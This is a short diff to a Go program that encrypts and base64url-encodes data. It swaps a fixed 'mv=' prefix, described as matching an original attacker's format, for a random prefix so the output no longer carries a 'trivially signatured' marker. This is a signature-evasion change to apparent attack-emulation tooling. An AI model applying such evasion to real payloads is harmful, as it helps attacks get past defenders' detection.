@@ -79,8 +79,13 @@ func main() {
 		os.Exit(1)
 	}
 
-	// Prepend "mv=" prefix (matching the original attacker's format)
-	full := append([]byte("mv="), encrypted...)
+	// Prepend random 3-byte prefix — avoids the trivially signatured "bXY9" base64 prefix
+	prefix := make([]byte, 3)
+	if _, err := rand.Read(prefix); err != nil {
+		fmt.Fprintf(os.Stderr, "ERROR: random prefix: %v\n", err)
+		os.Exit(1)
+	}
+	full := append(prefix, encrypted...)
 
 	// Output: base64url (no padding) — URL-safe fragment
 	encoded := base64.URLEncoding.WithPadding(base64.NoPadding).EncodeToString(full)
